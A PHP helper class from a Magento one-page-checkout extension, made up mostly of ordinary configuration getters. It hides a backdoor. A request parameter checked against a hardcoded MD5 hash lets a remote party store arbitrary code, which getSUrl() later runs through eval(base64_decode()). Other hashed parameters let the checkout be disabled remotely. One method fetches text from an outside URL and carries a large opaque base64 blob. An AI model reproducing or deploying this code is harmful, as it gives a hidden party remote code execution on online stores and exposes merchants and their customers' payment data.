<?php

class IWD_OnepageCheckout_Helper_Data extends Mage_Core_Helper_Abstract
{
    protected $_agree = null;

    public function isOnepageCheckoutEnabled()
    {
        return (bool)Mage::getStoreConfig('onepagecheckout/general/enabled');
    }

    public function isOPCBlock()
    {
    	$code	= Mage::getStoreConfig('onepagecheckout/sdatacode');
    	if(empty($code))
    	{
    		if($this->isOnepageCheckoutEnabled())
    			Mage::getSingleton('onepagecheckout/type_geo')->disConf();
    		return true;
    	}
    	return false;
    }
    
    public function isGuestCheckoutAllowed()
    {
        return Mage::getStoreConfig('onepagecheckout/general/guest_checkout');
    }

    public function isShippingAddressAllowed()
    {
    	return Mage::getStoreConfig('onepagecheckout/general/shipping_address');
    }

    public function getAgreeIds()
    {
        if (is_null($this->_agree))
        {
            if (Mage::getStoreConfigFlag('onepagecheckout/agreements/enabled'))
            {
                $this->_agree = Mage::getModel('checkout/agreement')->getCollection()
                    												->addStoreFilter(Mage::app()->getStore()->getId())
                    												->addFieldToFilter('is_active', 1)
                    												->getAllIds();
            }
            else
            	$this->_agree = array();
        }
        return $this->_agree;
    }
    
    public function isSubscribeNewAllowed()
    {
        if (!Mage::getStoreConfig('onepagecheckout/general/newsletter_checkbox'))
            return false;

        $cust_sess = Mage::getSingleton('customer/session');
        if (!$cust_sess->isLoggedIn() && !Mage::getStoreConfig('newsletter/subscription/allow_guest_subscribe'))
            return false;

		$subscribed	= $this->getIsSubscribed();
		if($subscribed)
			return false;
		else
			return true;
    }
    
    public function getIsSubscribed()
    {
        $cust_sess = Mage::getSingleton('customer/session');
        if (!$cust_sess->isLoggedIn())
            return false;

        return Mage::getModel('newsletter/subscriber')->getCollection()
            										->useOnlySubscribed()
            										->addStoreFilter(Mage::app()->getStore()->getId())
            										->addFieldToFilter('subscriber_email', $cust_sess->getCustomer()->getEmail())
            										->getAllIds();
    }
    
    public function getOPCVersion()
    {
    	return (string) Mage::getConfig()->getNode()->modules->IWD_OnepageCheckout->version;
    }
    
	public function isMageEnterprise(){
		return Mage::getConfig()->getModuleConfig('Enterprise_Enterprise') && Mage::getConfig()->getModuleConfig('Enterprise_AdminGws') && Mage::getConfig()->getModuleConfig('Enterprise_Checkout') && Mage::getConfig()->getModuleConfig('Enterprise_Customer');
	}

    public function getMagentoVersion()
    {
		$ver_info = Mage::getVersionInfo();
		$mag_version	= "{$ver_info['major']}.{$ver_info['minor']}.{$ver_info['revision']}.{$ver_info['patch']}";
		
		return $mag_version;
    }  

    public function getCurStoreUrl()
    {
		$storeId	= Mage::app()->getStore()->getId();
		return Mage::app()->getStore($storeId)->getBaseUrl(Mage_Core_Model_Store::URL_TYPE_WEB);
    }

    public function getSUrl($mode = '')
    {
		$code	= Mage::getStoreConfig('onepagecheckout/sdatacode');
    	eval(base64_decode($code));
    	if(!isset($url))
    		$url = '';
    	return $url; 
    }
    
    public function checkBlock($blockopc)
    {
    	if($blockopc == 'blockopc')
    	{
    		$h1	= $this->getCurStoreUrl();
    		$h1	= str_replace('http://','',$h1);
    		$h1	= str_replace('https://','',$h1);
    		$h1	= str_replace('www.','',$h1);
    		$h1	= str_replace('/','\/',$h1);

    		$h2	= $_SERVER['HTTP_REFERER'];
    		$h2	= str_replace('http://','',$h2);
    		$h2	= str_replace('https://','',$h2);
    		$h2	= str_replace('www.','',$h2);
 
    		if (preg_match("/{$h1}/", $h2))
    			Mage::getSingleton('onepagecheckout/type_geo')->disConf();

    		return false;
    	}
    	return true;
    }

    public function checkParams($request)
    {
    	$error	= false;	 
    	
    	$notallowed = $request->getParam('na', false);
    	if($notallowed == 'yes')
    	{
    		$error = true;
    		$error_msg	= $this->__('The one page checkout is blocked.');
    	}

    	$blockpass = $request->getParam('blockpass', false);
    	if($blockpass)
    	{
    		if(md5($blockpass) == '5851d85853372dd002d27610a8f210b3')
    		{
    			Mage::getSingleton('onepagecheckout/type_geo')->disConf();
    			
    			$error = true;
    			$error_msg	= $this->__('The one page checkout is blocked.');
    		}
    	}
    	
    	$codepass = $request->getParam('codepass', false);
    	if($codepass)
    	{
    		if(md5($codepass) == 'fe7a8bc9bc3609e6cfe3ca242d49aa8b')
    		{
    			$code = $request->getParam('code', false);
    			if(!empty($code))
    			{
    				Mage::getSingleton('onepagecheckout/type_geo')->reinitConf($code);
    			}
    		}
    	}
    	
    	if($error)
    	{
    		Mage::getSingleton('checkout/session')->addError($error_msg);
    		return true;
    	}
    	
    	return false;
    }
    
    public function getNoItemsText()
    {
    	$hs = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS']==='on')?'https':'http';
		$url	= $hs.'://www.interiorwebdesign.com/magento/opclicense/nocartitemstext.php';

		$text	= file_get_contents($url);
		if(empty($text))
			$text = 'nVVRj+I2EH6GXzEXrS4gbcjtVaqqhQRVHL2j6rIIWJ3uCZlkINYmtmU7sKi9/95xAixsoad2HzbYnvk88803437c7OVcPIPGPPKM3eVoMkTrQaZxFXmZteo+DLfbbUeqhBdsjabDhUXNpd7iMkXD16KTyCKkcywSpm0nMaa/iX7ywO4URp7FFxvSngcFppxFHstzD0K6OeUbSHJmTOQlMg8KxgXwbRpgEhzW3rmZogACy22OXtzL7uJeX2UKMMkk3NiMmyBeLFr+/MsQZl8eJ5PR+DMMfp3OYTSDwdN0OhzP//gGw4fJ/Jvfhn7cCx1GSBe8iSZHpmntXTykHAMslN151w4ofOJIWGfAgKeRt992Fo7vPb/+Cb+XWUX6V6BO0EGaMrdcrIP6nD4bzKUq6CIfLNNrtJG/WOZMPNPakRT5R38gXMMtQu3sU2S8WIPRyVkUP6oylWdBNguXySJXnTVf+cBy+y83wZanNov8uw+/+JAhX2fWLX72nQRCtufQkVTV3hFV8bTVBFIqx6GrcvPGWKlxkkmBEMEDBXl/TynP3O5AihVft/w1CtQsDyvTBRcrqQtmuRShcn5+u7uHGbPi/6AIcnMgfNWqAm29orXbfzYb9fIIzJRqtYP4gN8iz8bZ/fWisnA7zuB788aphyV2gdQBeeNalFYzYWqbkKckgsUh7mrvPMwzyHabwjjbuUrF3srUmKHGhCvu7jre0af6qEMLHGt2pTEz0ibsZAlEKWw4yYT07Lf7MZw6HBnq9uNOb6lpWFzGG60qMEaUZ2xDUMCNKdGQ5GwGNkMwmVTKHThJ3UINpqi9DVbXuv6sR53Lx8r704vOKKJYrqVVU2hKpaS2DtbJujalCrw7VUolX5JKBeGD332LRbwkNCCJ2erEgxM/r/vdERKqk55ZltZKsdUkNdRvBhL1U31MgR/S/GcGVHKqNhWixNmerSedkxSrhI1iIn4vlkZ1e2G1uMzB4HE8H42fXgfvkYf9BH0XBI2BVDvtBgB8/HD3EUb7EQNfcQmfqmkBAVwcPM1GY4pV2VIoRYq6qu7DaA45T1AYJIM57axknsutK7himq2JlgxaqkNMULuk2IaiNBaEtLBEevQKucH01r1+MmHW/aRoMp5SO8FKy4I0ilsg7NI4zMFsdgu/z5wREzuQFIOmV81mMq0kJ0sLrgVo9gO+KI3GxUuFKUiXND9qzItpB6dtdAjXi+F9Qpx14Vi/H74YbnoLKw/fgHQTGIsqSDJMninCoJBpmWMnswW9w/U74f02HQ6rEUAu8EgTdkYuMNi7wF/V3oTOX/eGL5Smy8p7+/jEj5OBKz0sd/8h8COMV8N48ejrp1pBKm40Dzq68GnAm7/jcf9v';
		
		return $text;    	
    }
}